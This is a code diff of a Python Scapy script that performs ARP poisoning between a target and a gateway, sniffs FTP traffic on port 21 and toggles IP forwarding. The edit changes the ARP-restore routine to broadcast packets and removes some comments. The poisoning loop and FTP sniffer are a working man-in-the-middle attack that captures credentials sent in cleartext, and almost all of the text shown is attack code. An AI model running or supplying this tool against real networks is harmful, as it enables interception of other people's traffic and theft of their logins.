@@ -1,3 +1,4 @@
+
 import argparse
 import sys
 import time
@@ -21,25 +22,23 @@ def parse_args():
     return args
 
 def restore(ip_src, mac_src, ip_target, mac_target):
-    """Send legitimate ARP packets to restore the network using Layer 2 sendp."""
-    print("\n[*] Restoring ARP tables...")
-    # L2 packet for the target (with the REAL MAC of the gateway)
-    l2_packet_for_target = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src, hwsrc=mac_src)
+    """Send broadcast ARP packets to restore the network."""
+    print("\n[*] Restoring ARP tables using broadcast...")
     
-    # L2 packet for the gateway (with the REAL MAC of the target)
-    l2_packet_for_gateway = Ether(dst=mac_src) / ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target, hwsrc=mac_target)
+    # Tell EVERYONE on the network the correct MAC for the gateway
+    l2_broadcast_packet_for_target = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=ip_target, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_src, hwsrc=mac_src)
+    
+    # Tell EVERYONE on the network the correct MAC for the victim
+    l2_broadcast_packet_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=ip_src, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_target, hwsrc=mac_target)
     
     # Send packets multiple times to ensure they are received
-    sendp(l2_packet_for_target, count=4, verbose=False)
-    sendp(l2_packet_for_gateway, count=4, verbose=False)
+    sendp(l2_broadcast_packet_for_target, count=4, verbose=False)
+    sendp(l2_broadcast_packet_for_gateway, count=4, verbose=False)
     print("[*] ARP tables restored.")
 
 def poison_loop(ip_src, mac_src, ip_target, mac_target):
     """Send malicious ARP packets in a loop using Layer 2 sendp."""
-    # L2 packet for the target: make it think WE are the gateway
     l2_packet_for_target = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)
-    
-    # L2 packet for the gateway: make it think WE are the target
     l2_packet_for_gateway = Ether(dst=mac_src) / ARP(op=2, pdst=ip_src, hwdst=mac_src, psrc=ip_target)
     
     print("[*] Starting ARP poisoning... Press CTRL+C to stop.")
@@ -80,12 +79,10 @@ def main():
     
     print("[*] Starting FTP sniffer on port 21...")
     try:
-        # Start sniffing on the main thread
         sniff(filter="tcp port 21", prn=ftp_sniffer, store=False)
     except Exception as e:
         print(f"[!] An error occurred during sniffing: {e}")
     finally:
-        # Restore ARP tables and disable IP forwarding before exiting
         restore(args.ip_src, args.mac_src, args.ip_target, args.mac_target)
         print("[*] Disabling IP forwarding...")
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
